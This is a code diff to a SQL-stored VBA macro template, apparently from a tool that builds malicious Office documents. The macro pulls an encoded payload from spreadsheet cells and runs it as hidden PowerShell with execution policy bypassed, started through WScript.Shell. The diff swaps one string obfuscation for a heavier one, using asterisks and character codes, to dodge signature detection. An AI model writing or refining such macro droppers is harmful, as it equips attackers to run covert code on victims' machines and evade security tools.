@@ -290,12 +290,9 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbed', 'harn
 Sub |RANDOMNAME|()
     Dim x, c As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
-    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -no" & "p -n" & "oni " & _
-    "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
-    "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & "" & _
-    " -e" & "nc " & x
+    c = "po" & "W*er" & "sH*el" & "L -W 1 -C po" & "w*eRs" & "he*Ll ([char]45+[char]10*1+[char]110+[char]99) " & x
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
-    s.Run c, 0
+    s.Run Replace(c, "*", ""), 0
 End Sub
 
 ');
